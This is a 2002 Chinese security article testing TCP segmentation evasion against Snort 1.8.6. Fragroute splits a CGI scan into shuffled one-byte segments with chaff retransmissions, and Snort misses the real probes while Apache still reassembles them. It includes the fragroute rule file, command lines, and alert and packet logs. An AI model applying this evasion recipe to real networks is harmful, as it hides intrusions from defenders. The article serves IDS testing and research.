---
title: "对Snort进行TCP分片攻击逃避检测的测试"
date: 2002-04-01T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-382"
---

文章提交：[stardust](http://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=20) (bugmail_at_telekbird.com.cn)

1、理论与工具

1998年1月Ptacek和Newsham发表了名为“Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection”的论文，描述了IDS产品及模型存在一些基本面上的问题及从TCP/IP底层绕过IDS检测方法。其主要思想是利用IDS对数据报的分析处理方式与终端服务器TCP/IP实现方式的不同，进行插入、逃避及拒绝服务攻击，使IDS无法正确地检测到攻击。这篇论文似乎已经成为IDS相关的经典，值得好好一读，论文虽然针对当时的IDS产品，但在当今的产品中是不是就不存在它所描述的问题了呢？从以下的测试结果看至少对当前的snort，答案是否定的。

出于实现论文中描述的攻击方式的需要，Dug Song（呵呵，我佩服的牛人，这家伙的编程能力和想像力总是让人出乎意外）实现了一个工具：fragroute，它可以拦截、修改、重写、重排发往特定机器的数据包，几乎可以完全控制数据包的发送方式，满足论文所描述的各种攻击的需要，成了攻击和测试IDS产品的利器。具体如何使用参看手册，在这个小贴子里不再多说。

论文和工具在文末的参考链接里可以找到。

2、简单测试

2.1 测试环境

测试通过两台机器进行，x.x.x.x与y.y.y.y都是安装了RedHat 7.2的机器，x.x.x.x机器作为发起攻击的机器，在上面的安装了fragroute和一个简单的CGI扫描器。y.y.y.y作为受攻击的机器，上面安装了snort和apache，在apache的cgi-bin目录中故意放入了几个有漏洞的脚本。测试分两次进行，第一次是正常攻击情况，第二次是打开fragroute后的情况。两次测试中，除了第二次中打开fragroute分片转发外，其他的如snort的启动方式、CGI扫描的方式都是完全一样的。下面是测试中的记录：

看一下snort的版本，我们用的是最新1.8.6版：

[root@y.y.y.y /var/log/snort]> snort -V

-*> Snort! <*-

Version 1.8.6 (Build 105)

By Martin Roesch (roesch@sourcefire.com, [www.snort.org](http://www.snort.org/))

两次测试中启动snort的命令行：

[root@y.y.y.y /var/log/snort]> snort -qdv -c /root/.snortrc -A fast host x.x.x.x 

启动CGI扫描器的命令，而且两次测试中得到的扫描器输出结果是完全一样（其中报告发现的脚本都是故意放置的），攻击都是成功的：

[root@x.x.x.x exploit]# ./cgihk y.y.y.y

                 [CKS & Fdisk]'s CGI Checker

HTTP/1.1 200 OK

Date: Tue, 23 Apr 2002 13:03:20 GMT

Server: Apache/1.3.22 (Unix) PHP/4.1.2 mod_ssl/2.8.5 OpenSSL/0.9.6b

X-Powered-By: PHP/4.1.2

Set-Cookie: PHPSESSID=ed9866d876a372a265833a46f5e6026f; path=/

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0

Pragma: no-cache

Connection: close

Content-Type: text/html

Searching for phf : Not Found

Searching for Count.cgi : Not Found

Searching for test-cgi : Found!!

Searching for php.cgi : Not Found

Searching for handler : Not Found

Searching for webgais : Not Found

Searching for websendmail : Not Found

Searching for webdist.cgi : Found!!

Searching for faxsurvey : Not Found

Searching for htmlscript : Not Found

Searching for pfdisplay : Not Found

Searching for perl.exe : Not Found

Searching for wwwboard.pl : Found!!

2.2 正常攻击情况下snort的记录

[root@y.y.y.y /var/log/snort]> ls -l

total 20

drwxr-xr-x    3 root     root         8192 Apr 23 21:22 ./

drwxr-xr-x    7 root     root         4096 Apr 23 10:21 ../

drwx------    2 root     root         4096 Apr 23 21:22 x.x.x.x/

-rw-------    1 root     root         2061 Apr 23 21:22 alert

[root@y.y.y.y /var/log/snort]> cat alert

04/23-21:22:48.584284  [**] [1:886:3] WEB-CGI phf access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1210 -> y.y.y.y:80

04/23-21:22:48.584284  [**] [1:1149:3] WEB-MISC count.cgi access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1211 -> y.y.y.y:80

04/23-21:22:48.584284  [**] [1:835:1] WEB-CGI test-cgi access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1212 -> y.y.y.y:80

04/23-21:22:48.604284  [**] [1:824:2] WEB-CGI php access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1213 -> y.y.y.y:80

04/23-21:22:48.604284  [**] [1:1141:2] WEB-MISC handler access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1214 -> y.y.y.y:80

04/23-21:22:48.604284  [**] [1:838:2] WEB-CGI webgais access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1215 -> y.y.y.y:80

04/23-21:22:48.604284  [**] [1:815:2] WEB-CGI websendmail access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1216 -> y.y.y.y:80

04/23-21:22:48.604284  [**] [1:1163:2] WEB-MISC webdist.cgi access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1217 -> y.y.y.y:80

04/23-21:22:48.614284  [**] [1:857:2] WEB-CGI faxsurvey access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1218 -> y.y.y.y:80

04/23-21:22:48.624284  [**] [1:826:2] WEB-CGI htmlscript access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1219 -> y.y.y.y:80

04/23-21:22:48.624284  [**] [1:832:1] WEB-CGI perl.exe access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1221 -> y.y.y.y:80

04/23-21:22:48.624284  [**] [1:1175:3] WEB-MISC wwwboard.pl access [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1222 -> y.y.y.y:80

可以看到snort正确地报告了机器受到的CGI扫描攻击。

下面是正常攻击情况下，攻击过程中交换的数据包其中一例：

.

.

.

扫描请求的包

04/23-21:22:48.584284 x.x.x.x:1210 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:54477 IpLen:20 DgmLen:79 DF

***AP*** Seq: 0x5533DAD2  Ack: 0x569A231B  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4197914 3968556 

47 45 54 20 2F 63 67 69 2D 62 69 6E 2F 70 68 66  GET /cgi-bin/phf

20 48 54 54 50 2F 31 2E 30 0A 0A                  HTTP/1.0..

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

.

.

.

服务器回应的包

04/23-21:22:48.584284 y.y.y.y:80 -> x.x.x.x:1210

TCP TTL:64 TOS:0x0 ID:44344 IpLen:20 DgmLen:522 DF

***AP*** Seq: 0x569A231B  Ack: 0x5533DAED  Win: 0x16A0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 3968556 4197914 

48 54 54 50 2F 31 2E 31 20 34 30 34 20 4E 6F 74  HTTP/1.1 404 Not

20 46 6F 75 6E 64 0D 0A 44 61 74 65 3A 20 54 75   Found..Date: Tu

65 2C 20 32 33 20 41 70 72 20 32 30 30 32 20 31  e, 23 Apr 2002 1

33 3A 32 32 3A 34 38 20 47 4D 54 0D 0A 53 65 72  3:22:48 GMT..Ser

76 65 72 3A 20 41 70 61 63 68 65 2F 31 2E 33 2E  ver: Apache/1.3.

32 32 20 28 55 6E 69 78 29 20 50 48 50 2F 34 2E  22 (Unix) PHP/4.

31 2E 32 20 6D 6F 64 5F 73 73 6C 2F 32 2E 38 2E  1.2 mod_ssl/2.8.

35 20 4F 70 65 6E 53 53 4C 2F 30 2E 39 2E 36 62  5 OpenSSL/0.9.6b

0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C  ..Connection: cl

6F 73 65 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70  ose..Content-Typ

65 3A 20 74 65 78 74 2F 68 74 6D 6C 3B 20 63 68  e: text/html; ch

61 72 73 65 74 3D 69 73 6F 2D 38 38 35 39 2D 31  arset=iso-8859-1

0D 0A 0D 0A 3C 21 44 4F 43 54 59 50 45 20 48 54  ....<!DOCTYPE HT

4D 4C 20 50 55 42 4C 49 43 20 22 2D 2F 2F 49 45  ML PUBLIC "-//IE

54 46 2F 2F 44 54 44 20 48 54 4D 4C 20 32 2E 30  TF//DTD HTML 2.0

2F 2F 45 4E 22 3E 0A 3C 48 54 4D 4C 3E 3C 48 45  //EN">.<HTML><HE

41 44 3E 0A 3C 54 49 54 4C 45 3E 34 30 34 20 4E  AD>.<TITLE>404 N

6F 74 20 46 6F 75 6E 64 3C 2F 54 49 54 4C 45 3E  ot Found</TITLE>

0A 3C 2F 48 45 41 44 3E 3C 42 4F 44 59 3E 0A 3C  .</HEAD><BODY>.<

48 31 3E 4E 6F 74 20 46 6F 75 6E 64 3C 2F 48 31  H1>Not Found</H1

3E 0A 54 68 65 20 72 65 71 75 65 73 74 65 64 20  >.The requested 

55 52 4C 20 2F 63 67 69 2D 62 69 6E 2F 70 68 66  URL /cgi-bin/phf

20 77 61 73 20 6E 6F 74 20 66 6F 75 6E 64 20 6F   was not found o

6E 20 74 68 69 73 20 73 65 72 76 65 72 2E 3C 50  n this server.<P

3E 0A 3C 48 52 3E 0A 3C 41 44 44 52 45 53 53 3E  >.<HR>.<ADDRESS>

41 70 61 63 68 65 2F 31 2E 33 2E 32 32 20 53 65  Apache/1.3.22 Se

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

2.3 TCP分片攻击情况下snort记录

再次对y.y.y.y进行同样的CGI扫描攻击，同时在攻击机器上打开fragroute分片转发，对攻击数据包进行tcp分片处理。对fragroute设定的规则是tcp包每片一个字节数据，打乱发送次序并加杂着虚假重传包。

[root@x.x.x.x root]# cat /tmp/frag.txt

tcp_seg 1

tcp_chaff rexmit

order random

[root@x.x.x.x root]# fragroute -f /tmp/frag.txt y.y.y.y

fragroute: tcp_seg -> tcp_chaff -> order

查看此次攻击的snort记录:

[root@y.y.y.y /var/log/snort]> ls -l

total 20

drwxr-xr-x    3 root     root         8192 Apr 23 21:29 ./

drwxr-xr-x    7 root     root         4096 Apr 23 10:21 ../

drwx------    2 root     root         4096 Apr 23 21:29 x.x.x.x/

-rw-------    1 root     root         1110 Apr 23 21:29 alert

[root@y.y.y.y /var/log/snort]> cat alert

04/23-21:29:44.444284  [**] [1:1104:3] WEB-MISC whisker space splice attack [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1223 -> y.y.y.y:80

04/23-21:29:44.444284  [**] [1:1104:3] WEB-MISC whisker space splice attack [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1223 -> y.y.y.y:80

04/23-21:29:44.464284  [**] [1:1104:3] WEB-MISC whisker space splice attack [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1224 -> y.y.y.y:80

04/23-21:29:44.464284  [**] [1:1104:3] WEB-MISC whisker space splice attack [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1224 -> y.y.y.y:80

04/23-21:29:44.474284  [**] [1:1104:3] WEB-MISC whisker space splice attack [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1225 -> y.y.y.y:80

04/23-21:29:44.474284  [**] [1:1104:3] WEB-MISC whisker space splice attack [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} x.x.x.x:1226 -> y.y.y.y:80

可以看到全部是误报，攻击已经被有效地隐蔽过去了。

查看攻击过程中交换的数据报片断，发现攻击数据包都是只含一个字节数据的报文，而且发送的次序已经乱的不可辨别，但服务器TCP/IP堆栈来说，它还是能够正确重组的。

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:33212 IpLen:20 DgmLen:60 DF

******S* Seq: 0x6F8E312C  Ack: 0x0  Win: 0x16D0  TcpLen: 40

TCP Options (5) => MSS: 1460 SackOK TS: 4239504 0 NOP WS: 0 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:60 DF

***A**S* Seq: 0x712B69A4  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 40

TCP Options (5) => MSS: 1460 SackOK TS: 4010144 4239504 NOP WS: 0 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:33213 IpLen:20 DgmLen:52 DF

***A**** Seq: 0x6F8E312D  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:19801 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E313C  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

66                                               f

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:21838 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E3144  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

2E                                               .

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:29137 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E3132  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

63                                               c

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22789 IpLen:20 DgmLen:64 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 44

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12604 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22790 IpLen:20 DgmLen:72 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 52

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12612 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22791 IpLen:20 DgmLen:80 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 60

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12594 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:39154 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E313D  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

20                                                

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:17372 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E3141  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

50                                               P

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:6932 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E313F  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

54                                               T

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:699 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E3143  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

31                                               1

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:33771 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E312D  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

47                                               G

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:37979 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E313B  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

68                                               h

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 x.x.x.x:1224 -> y.y.y.y:80

TCP TTL:64 TOS:0x0 ID:19411 IpLen:20 DgmLen:53 DF

***AP*** Seq: 0x6F8E3140  Ack: 0x712B69A5  Win: 0x16D0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4239504 4010144 

54                                               T

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22792 IpLen:20 DgmLen:80 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 60

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12604 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22793 IpLen:20 DgmLen:80 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 60

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12609 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22794 IpLen:20 DgmLen:80 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 60

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12607 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

04/23-21:29:44.464284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22795 IpLen:20 DgmLen:80 DF

***A**** Seq: 0x712B69A5  Ack: 0x6F8E312D  Win: 0x16A0  TcpLen: 60

TCP Options (6) => NOP NOP TS: 4010144 4239504 NOP NOP Sack: 28558@12611 

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

.

.

.

服务器程序重组数据包，经过apache处理后返回的结果，可见扫描攻击是成功的。

04/23-21:29:44.474284 y.y.y.y:80 -> x.x.x.x:1224

TCP TTL:64 TOS:0x0 ID:22843 IpLen:20 DgmLen:522 DF

***AP*** Seq: 0x712B69A5  Ack: 0x6F8E3148  Win: 0x16A0  TcpLen: 32

TCP Options (3) => NOP NOP TS: 4010145 4239504 

48 54 54 50 2F 31 2E 31 20 34 30 34 20 4E 6F 74  HTTP/1.1 404 Not

20 46 6F 75 6E 64 0D 0A 44 61 74 65 3A 20 54 75   Found..Date: Tu

65 2C 20 32 33 20 41 70 72 20 32 30 30 32 20 31  e, 23 Apr 2002 1

33 3A 32 39 3A 34 34 20 47 4D 54 0D 0A 53 65 72  3:29:44 GMT..Ser

76 65 72 3A 20 41 70 61 63 68 65 2F 31 2E 33 2E  ver: Apache/1.3.

32 32 20 28 55 6E 69 78 29 20 50 48 50 2F 34 2E  22 (Unix) PHP/4.

31 2E 32 20 6D 6F 64 5F 73 73 6C 2F 32 2E 38 2E  1.2 mod_ssl/2.8.

35 20 4F 70 65 6E 53 53 4C 2F 30 2E 39 2E 36 62  5 OpenSSL/0.9.6b

0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C  ..Connection: cl

6F 73 65 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70  ose..Content-Typ

65 3A 20 74 65 78 74 2F 68 74 6D 6C 3B 20 63 68  e: text/html; ch

61 72 73 65 74 3D 69 73 6F 2D 38 38 35 39 2D 31  arset=iso-8859-1

0D 0A 0D 0A 3C 21 44 4F 43 54 59 50 45 20 48 54  ....<!DOCTYPE HT

4D 4C 20 50 55 42 4C 49 43 20 22 2D 2F 2F 49 45  ML PUBLIC "-//IE

54 46 2F 2F 44 54 44 20 48 54 4D 4C 20 32 2E 30  TF//DTD HTML 2.0

2F 2F 45 4E 22 3E 0A 3C 48 54 4D 4C 3E 3C 48 45  //EN">.<HTML><HE

41 44 3E 0A 3C 54 49 54 4C 45 3E 34 30 34 20 4E  AD>.<TITLE>404 N

6F 74 20 46 6F 75 6E 64 3C 2F 54 49 54 4C 45 3E  ot Found</TITLE>

0A 3C 2F 48 45 41 44 3E 3C 42 4F 44 59 3E 0A 3C  .</HEAD><BODY>.<

48 31 3E 4E 6F 74 20 46 6F 75 6E 64 3C 2F 48 31  H1>Not Found</H1

3E 0A 54 68 65 20 72 65 71 75 65 73 74 65 64 20  >.The requested 

55 52 4C 20 2F 63 67 69 2D 62 69 6E 2F 70 68 66  URL /cgi-bin/phf

20 77 61 73 20 6E 6F 74 20 66 6F 75 6E 64 20 6F   was not found o

6E 20 74 68 69 73 20 73 65 72 76 65 72 2E 3C 50  n this server.<P

3E 0A 3C 48 52 3E 0A 3C 41 44 44 52 45 53 53 3E  >.<HR>.<ADDRESS>

41 70 61 63 68 65 2F 31 2E 33 2E 32 32 20 53 65  Apache/1.3.22 Se

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

3、结论

TCP分片攻击是非常有效的从底层绕过IDS检测的攻击方式，最新版本的snort 1.8.6不能正确处理这类攻击，我想其他的IDS产品都可能或多或少地存在这类问题。事实上，绕过IDS检测的分片方式还有好几种，只要IDS与服务器本身的TCP/IP堆栈对数据包的处理方式上存在着不同，都存在着被利用的机会。

4、参考

[http://www.snort.org](http://www.snort.org/)

[http://www.securiteam.com/unixfocus/5XP0I206UU.html](http://www.securiteam.com/unixfocus/5XP0I206UU.html)

[http://www.monkey.org/~dugsong/fragroute/index.html](http://www.monkey.org/~dugsong/fragroute/index.html)

[http://www.robertgraham.com/mirror/Ptacek-Newsham-Evasion-98.html](http://www.robertgraham.com/mirror/Ptacek-Newsham-Evasion-98.html)
